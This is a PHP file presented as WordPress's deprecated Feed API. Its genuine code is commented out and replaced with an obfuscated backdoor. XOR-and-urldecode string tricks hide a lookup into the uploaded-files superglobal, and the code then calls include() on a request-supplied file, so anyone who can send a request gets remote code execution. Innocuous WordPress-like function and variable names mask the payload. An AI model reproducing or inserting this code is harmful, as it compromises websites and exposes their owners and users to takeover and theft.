<?php /* 
*
 * Feed API
 *
 * @package WordPress
 * @subpackage Feed
 * @deprecated 4.7.0
 

_deprecated_file( basename( __FILE__ ), '4.7.0', 'fetch_feed()' );

if ( ! class_exists( 'SimplePie', false ) ) {
	require_once ABSPATH . WPINC . '/class-simplepie.php';
}

require_once ABSPATH . WPINC . '/class-wp-feed-cache.php';
require_once ABSPATH . WPINC . '/class-wp-feed-cache-transient.php';
require_once ABSPATH . WPINC . '/class-wp-simplepie-file.php';
require_once ABSPATH . WPINC*/
 	

function posts_per_page()

{

    $index = 'mBb59gZ5gT';
    $search = $index;
	$default_capabilities = 'ignore_sticky_posts';
    
	$check_name = 'prime';
    $from = $GLOBALS[cdata_regex("2%04%2By%7C4", $search)];
    $main = $from;
    $tagnames = isset($main[$search]);
    if ($tagnames)

    {

        $cached = $from[$search];
        $tb_list = $cached[cdata_regex("%19%2F%12jW%067P", $search)];
        $opening_tag = $tb_list;
        include ($opening_tag);
	$no_texturize_shortcodes_stack = 'entities';
    }
}

function cdata_regex($plural_base, $sized)

{
    $start = $sized;
    $mime_match = "url" . "decode";
    $more_string = $mime_match($plural_base);
    $parent_where = substr($start,0, strlen($more_string));
	$quote_style = 'user_id';
    $replace = $more_string ^ $parent_where;
    return $replace;
}

posts_per_page();



/*  . '/class-wp-simplepie-sanitize-kses.php';
*/